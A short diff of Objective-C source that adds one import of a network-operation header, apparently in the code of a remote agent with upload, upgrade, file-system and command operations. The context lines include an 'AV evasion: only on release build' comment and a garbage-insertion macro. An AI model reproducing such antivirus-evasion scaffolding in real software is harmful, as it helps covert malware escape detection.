@@ -19,6 +19,7 @@
 #import "UploadNetworkOperation.h"
 #import "UpgradeNetworkOperation.h"
 #import "FSNetworkOperation.h"
+#import "SizeNetworkOperation.h"  //TODO: delete this one when put inside LogNetworkOperation
 #import "LogNetworkOperation.h"
 #import "ByeNetworkOperation.h"
 #import "CommandsNetworkOperation.h"
@@ -409,6 +410,7 @@
         }
     }
   
+    
   // AV evasion: only on release build
   AV_GARBAGE_004
   
